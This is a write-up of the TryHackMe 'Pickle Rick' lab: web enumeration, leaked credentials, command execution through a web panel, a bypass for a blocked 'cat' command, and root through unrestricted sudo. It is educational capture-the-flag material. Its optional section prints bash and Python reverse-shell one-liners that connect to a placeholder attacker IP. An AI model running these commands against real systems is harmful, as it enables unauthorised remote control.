# Pickle Rick - TryHackMe Write-up

## Challenge Information

**Platform:** TryHackMe  
**Difficulty:** Easy  
**Objective:** Exploit a vulnerable machine and find 3 secret ingredients to help Rick transform back into a human.

---

## Initial Enumeration

### Nmap Port Scan

```bash
nmap -sC -sV -oN nmap_initial.txt <TARGET_IP>
```

**Results:**
- Port 22 (SSH) - Open
- Port 80 (HTTP) - Open

### Website Exploration

Accessing `http://<TARGET_IP>` we find a Rick and Morty themed web page.

**Source code analysis:**
```bash
curl http://<TARGET_IP> | grep -i "username\|password\|comment"
```

Viewing the page source code (Ctrl+U), we find an HTML comment revealing:
```html
<!-- Username: R1ckRul3s -->
```

---

## Directory Enumeration

### Using Gobuster/Dirbuster

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

**Directories/files found:**
- `/assets/` - Static resources directory
- `/robots.txt` - Robots file present
- `/login.php` - Login page
- `/portal.php` - Portal after login
- `/denied.php` - Access denied page

### Robots.txt Analysis

```bash
curl http://<TARGET_IP>/robots.txt
```

**Content found:**
```
Wubbalubbadubdub
```

This string looks like a password!

---

## Initial Exploitation - Login

### Credentials Found

- **Username:** `R1ckRul3s` (found in HTML)
- **Password:** `Wubbalubbadubdub` (found in robots.txt)

Accessing `http://<TARGET_IP>/login.php` and using the credentials, we gain access to the **Command Panel**.

---

## Command Panel Exploitation

### Testing Commands

The portal has a field for command execution. We test:

```bash
ls
```

**Output:**
```
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

### Read Attempt - cat Blocked

```bash
cat Sup3rS3cretPickl3Ingred.txt
```

**Result:** The `cat` command is disabled!

### Bypass with Alternative Commands

```bash
less Sup3rS3cretPickl3Ingred.txt
# or
more Sup3rS3cretPickl3Ingred.txt
# or
grep . Sup3rS3cretPickl3Ingred.txt
```

**First Ingredient Found!**

### Reading the Clue (clue.txt)

```bash
less clue.txt
```

**Content:**
```
Look around the file system for the other ingredient.
```

---

## Privilege Escalation and Ingredient Hunt

### Exploring the File System

```bash
ls -la /home
```

We find a directory for user **rick**.

```bash
ls -la /home/rick
```

**Files found:**
```
second ingredients
```

### Reading the Second Ingredient

```bash
less "/home/rick/second ingredients"
```

**Second Ingredient Found!**

---

## Checking Sudo Privileges

```bash
sudo -l
```

**Result:**
```
User www-data may run the following commands on ip-10-10-xxx-xxx:
    (ALL) NOPASSWD: ALL
```

**Excellent!** We have full sudo privileges without needing a password.

---

## Obtaining the Third Ingredient

### Accessing the Root Directory

```bash
sudo ls -la /root
```

**Files found:**
```
3rd.txt
snap
```

### Reading the Third Ingredient

```bash
sudo less /root/3rd.txt
```

**Third Ingredient Found!**

---

## Reverse Shell (Optional)

For greater comfort during exploitation, we can establish a reverse shell:

**On the attacker machine:**
```bash
nc -lvnp 4444
```

**In the web application:**
```bash
bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'
# or
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR_IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

After obtaining the shell, we can execute:
```bash
sudo su
```

To gain full root access.

---

## Question Answers

1. **What is the first ingredient Rick needs?**
   - *Answer obtained from: Sup3rS3cretPickl3Ingred.txt*

2. **What is the second ingredient Rick needs?**
   - *Answer obtained from: /home/rick/second ingredients*

3. **What is the final ingredient Rick needs?**
   - *Answer obtained from: /root/3rd.txt*

---

## Exploitation Summary

### Vulnerabilities Identified

1. **Credential Exposure:**
   - Username exposed in HTML comment
   - Password exposed in robots.txt

2. **Command Injection:**
   - Command panel allows arbitrary system command execution

3. **Insecure Sudo Configuration:**
   - www-data user with unrestricted sudo permissions (NOPASSWD: ALL)

### Lessons Learned

- Always check web page source code
- Enumerate common directories and files (robots.txt, etc.)
- Test alternative commands when one is blocked (cat → less/more/grep)
- Check sudo privileges when gaining system access
- Careful enumeration is fundamental to success

---

## Tools Used

- **Nmap** - Port scanning
- **Gobuster/Dirbuster** - Directory enumeration
- **Curl** - HTTP requests
- **Browser** - Web interface
- **Linux Commands** - System exploration

---

**Challenge Completed Successfully!**

*Write-up created for educational purposes - TryHackMe Platform*
